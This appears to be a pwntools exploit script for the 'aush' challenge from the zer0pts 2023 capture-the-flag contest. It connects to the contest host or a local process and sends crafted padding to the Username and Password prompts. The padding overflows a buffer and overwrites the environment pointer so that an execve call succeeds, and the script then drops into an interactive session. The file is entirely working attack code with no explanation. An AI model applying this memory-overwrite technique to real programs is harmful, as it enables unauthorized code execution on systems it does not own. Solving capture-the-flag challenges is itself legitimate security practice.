#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./aush")


def start(argv=[], *a, **kw):
    host = args.HOST or 'pwn.2023.zer0pts.com'
    port = int(args.PORT or 9006)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pause()

# overwrite envp with invalid format to fail execve
io.sendafter(b"Username: ", b"A" * (0x1f0 - 0x50))

# overwrite envp with NULL to not fail execve
io.sendafter(b"Password: ", b"A" * (0x1e8 - 0x90) + b"\x00" * 8)

io.interactive()
